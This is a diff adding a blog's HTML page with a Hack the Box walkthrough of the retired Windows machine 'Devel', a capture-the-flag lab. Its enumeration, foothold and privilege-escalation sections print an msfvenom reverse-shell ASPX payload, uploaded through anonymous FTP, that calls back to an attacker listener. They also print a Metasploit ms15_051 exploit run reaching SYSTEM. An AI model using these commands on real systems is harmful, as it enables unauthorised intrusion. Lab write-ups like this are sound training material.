@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Hack the Box - Devel - Calxus Blog</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Calxus Blog" property="og:site_name">
+  
+    <meta content="Hack the Box - Devel" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Devel, while relatively simple, demonstrates the security risks associated with some defaultp rogram configurations. It is a beginner-level machine which can be completed using publicly available exploits." property="og:description">
+  
+  
+    <meta content="http://localhost:4000/devel-walkthrough/" property="og:url">
+  
+  
+    <meta content="2020-06-23T19:06:22+01:00" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/devel.png" property="og:image">
+  
+  
+    
+    <meta content="HackTheBox" property="article:section">
+    
+  
+  
+    
+    <meta content="Easy" property="article:tag">
+    
+    <meta content="Windows" property="article:tag">
+    
+    <meta content="Retired" property="article:tag">
+    
+    <meta content="CVE" property="article:tag">
+    
+  
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@TheCalxus">
+  
+    <meta name="twitter:title" content="Hack the Box - Devel">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/devel-walkthrough/">
+  
+  
+    <meta name="twitter:description" content="Devel, while relatively simple, demonstrates the security risks associated with some defaultp rogram configurations. It is a beginner-level machine which can be completed using publicly available exploits.">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/devel.png">
+  
+
+	<meta name="description" content="Devel, while relatively simple, demonstrates the security risks associated with some defaultp rogram configurations. It is a beginner-level machine which can be completed using publicly available exploits.">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/calxus.png" alt="Calxus"></a>
+      </div>
+      <div class="author-name">Calxus</div>
+      <p>DevOps Engineer with a penchant for pentesting and proud owner of an over-engineered home network</p>
+      <div style="height: 5px"></div>
+      <div class="author-name"><a href="/hackthebox">hack the box</a></div>
+      <div class="site-category"><a href="/homenetwork">home network</a></div>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        <li><a href="https://twitter.com/TheCalxus" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <li class="github"><a href="http://github.com/calxus" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li class="email"><a href="mailto:calxus@protonmail.ch"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a href="https://hackthebox.eu/profile/317303" target="_blank"><i class="fa fa-cube"></i></a></li>
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2021 &copy; Calxus</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/devel.png alt="Hack the Box - Devel">
+        
+          <figcaption>Devel</figcaption>
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Hack the Box - Devel</h1>
+        <div class="page-date"><span>2020, Jun 23&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="overview">Overview</h2>
+<p>Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/devel]
+└─$ sudo nmap -p- -T4 10.129.113.247
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 19:37 GMT
+Nmap scan report for 10.129.113.247
+Host is up (0.016s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+</code></pre></div></div>
+<p>When accessing port 80 in a browser the default IIS page is visible and when connecting to the ftp server that is exposed as shown below you can see the same default page listed on the server. From there it is safe to assume that you have access to the same location and that we could upload a reverse webshell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/devel]
+└─$ ftp 10.129.113.247
+Connected to 10.129.113.247.
+220 Microsoft FTP Service
+Name (10.129.113.247:calxus): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+</code></pre></div></div>
+
+<h2 id="foothold">Foothold</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/devel]
+└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=4455 -f aspx &gt; reverse.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of aspx file: 2839 bytes
+</code></pre></div></div>
+<p>After generating the payload, we can put that in place on the ftp server and access it in a browser. Once we’ve done that, as long as we have a metasploit listener on the same port we should receive a shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.27:4455 
+[*] Sending stage (175174 bytes) to 10.129.113.247
+[*] Meterpreter session 1 opened (10.10.14.27:4455 -&gt; 10.129.113.247:49157) at 2021-03-15 19:55:35 +0000
+
+meterpreter &gt; getuid
+Server username: IIS APPPOOL\Web
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Once we received the shell, we can escalate by searching for the exploit using the local_exploit_suggester. Then running as below.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.27:7894 
+[*] Launching notepad to host the exploit...
+[+] Process 1692 launched.
+[*] Reflectively injecting the exploit DLL into 1692...
+[*] Injecting exploit into 1692...
+[*] Exploit injected. Injecting payload into 1692...
+[*] Payload injected. Executing exploit...
+[*] Sending stage (175174 bytes) to 10.129.113.247
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Meterpreter session 2 opened (10.10.14.27:7894 -&gt; 10.129.113.247:49158) at 2021-03-15 20:04:29 +0000
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre></div></div>
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Hack the Box - Devel&url=http://localhost:4000/devel-walkthrough/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/devel-walkthrough/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/devel-walkthrough/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#Easy" class="tag">&#35; Easy</a>
+          
+            <a href="/tags#Windows" class="tag">&#35; Windows</a>
+          
+            <a href="/tags#Retired" class="tag">&#35; Retired</a>
+          
+            <a href="/tags#CVE" class="tag">&#35; CVE</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js"></script>
+<script src="/assets/js/main.js"></script>
+
+</body>
+</html>
